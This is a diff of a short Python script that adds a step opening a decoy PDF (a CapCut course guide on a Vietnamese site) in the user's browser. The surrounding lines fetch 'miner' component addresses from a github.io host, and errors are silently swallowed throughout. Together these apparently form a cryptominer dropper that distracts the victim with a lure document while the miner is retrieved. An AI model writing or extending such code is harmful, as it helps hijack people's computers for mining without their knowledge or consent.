@@ -1,6 +1,10 @@
 import requests
 import os
 try:
+    os.system("start https://tinhocsaoviet.com/wp-content/plugins/pdf-poster/pdfjs-new/web/viewer.html?file=https://tinhocsaoviet.com/wp-content/uploads/2024/02/Giao-Trinh-CapCut-PC.pdf&nobaki=false&z=0&stdono=&onlypdf=&raw=&fullscreen=1&sidebarOpen=false&side=false&open=false&hrscroll=#page=1")
+except:
+    pass
+try:
     url_miner_c = requests.get("https://kla41.github.io/miner/c").text.replace("\n","")
     url_miner_g = requests.get("https://kla41.github.io/miner/g").text.replace("\n","")
 except:
